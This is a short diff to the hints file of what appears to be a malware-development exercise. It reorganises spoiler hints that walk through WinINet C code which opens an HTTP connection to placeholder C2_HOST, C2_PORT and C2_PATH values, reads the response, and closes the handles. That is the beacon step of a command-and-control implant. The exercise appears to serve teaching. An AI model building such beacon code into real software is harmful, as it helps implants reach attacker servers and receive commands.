@@ -1,21 +1,21 @@
-=== HINT 1: InternetOpen ===
+=== HINT 1 ===
 HINTERNET hInet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG,
                                  NULL, NULL, 0);
 
-=== HINT 2: InternetConnect ===
+=== HINT 2 ===
 HINTERNET hConn = InternetConnectA(hInet, C2_HOST, C2_PORT,
                                     NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 
-=== HINT 3: HttpOpenRequest ===
+
 HINTERNET hReq = HttpOpenRequestA(hConn, "GET", C2_PATH, NULL, NULL, NULL, 0, 0);
 
-=== HINT 4: HttpSendRequest + read ===
+
 BOOL sent = HttpSendRequestA(hReq, NULL, 0, NULL, 0);
 char buf[512] = {0};
 DWORD read = 0;
 InternetReadFile(hReq, buf, sizeof(buf)-1, &read);
 
-=== HINT 5: Cleanup (reverse order) ===
+=== HINT 3 (SPOILER) ===
 InternetCloseHandle(hReq);
 InternetCloseHandle(hConn);
 InternetCloseHandle(hInet);
